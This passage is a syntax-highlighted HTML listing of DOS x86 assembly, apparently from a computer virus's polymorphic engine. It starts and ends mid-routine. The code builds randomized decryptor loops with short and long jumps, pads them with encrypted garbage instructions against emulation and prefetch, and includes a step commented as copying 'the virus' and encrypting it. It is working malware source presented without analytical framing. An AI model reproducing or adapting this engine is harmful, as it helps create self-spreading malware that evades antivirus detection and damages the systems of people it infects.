        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">direct_ncmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; random in cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; check lenght of the jump</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; of the decryption loop</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">must_be_long</span><span class="sc0">                    </span><span class="sc1">; random short or long jmp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff83h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">do_short_jump</span><span class="sc0">

</span><span class="sc5">must_be_long</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; for the jz forward</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0374h</span><span class="sc0">                        </span><span class="sc1">; JZ=JE away</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; save JZ away offset</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_stojz</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ok_stojz</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; put JBE</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">ok_stojz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; do some garbage between</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; the exit jump and the jump</span><span class="sc0">
                                                </span><span class="sc1">; to the decryption loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7ah</span><span class="sc0">                          </span><span class="sc1">; not too big</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_garbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_garb_here</span><span class="sc0">

</span><span class="sc5">ok_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">no_garb_here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                         </span><span class="sc1">; JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_bjump</span><span class="sc0">

</span><span class="sc5">do_short_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">049h</span><span class="sc0">         </span><span class="sc1">; is a DEC CX ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_short_jump</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">normal_short_jump</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">; overwrite the dec cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; jump bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc0">                         </span><span class="sc1">; LOOP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">xchnstr</span><span class="sc0">

</span><span class="sc5">normal_short_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">                          </span><span class="sc1">; JNE=JNZ back</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">xchnstr</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">xchnstr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">xchnstr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">end_bjump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; made a JZ/JMP serie?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_garbage_ndd</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; make JZ (or JBE) to point</span><span class="sc0">
                                                </span><span class="sc1">; after some garbage instead</span><span class="sc0">
                                                </span><span class="sc1">; of just after the JMP to</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">07bh</span><span class="sc0">                         </span><span class="sc1">; the decryption loop</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_garbage_ndd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">no_garbage_ndd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; we can again change DS</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; we can now use all regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">gnum</span><span class="sc4">],</span><span class="sc2">0fh</span><span class="sc0">         </span><span class="sc1">; a little more max garbage</span><span class="sc0">
                                               </span><span class="sc1">; as anti-prefetch_probs in</span><span class="sc0">
                                               </span><span class="sc1">; this last stage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; put some more garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_more_needed</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; expecially if we encrypted</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; from end to begin - prefetch</span><span class="sc0">

</span><span class="sc5">no_more_needed</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; some garbage will be also encrypted</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; do the encrypted garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">; encrypt also some garabage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; add to encryption lenght</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_di</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; calculate pointer on code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">lets_cont</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
</span><span class="sc5">lets_cont</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; store pointer on code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc1">;; Decryptor building end</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; convert lenght in words</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_for_it</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">            </span><span class="sc1">; words?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_for_it</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; so dwords</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">go_for_it</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">; store lenght</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">; Copy code and encrypt it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">; copy the virus after</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc1">; Pointer SI on data place isn't usable anymore after this line!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">no_regdd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_decrement_ndd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_inc</span><span class="sc4">],</span><span class="sc2">4eh</span><span class="sc0">     </span><span class="sc1">; dec si</span><span class="sc0">
</span><span class="sc5">no_decrement_ndd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; are we rol(r)ling?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc2">0d2h</span><span class="sc0">       </span><span class="sc1">; first byte for ror/rol</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">  </span><span class="sc1">; no random value req</span><span class="sc0">

</span><span class="sc5">noro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; word operations?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pre_enc_loop_one</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">using_words</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; dwords</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">no_imm</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">long_stuff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">full_enc_loop</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">using_words</span><span class="sc0">

</span><span class="sc5">long_stuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">using_words</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; calculate lenght</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">no_imm</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_regused</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">come_here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
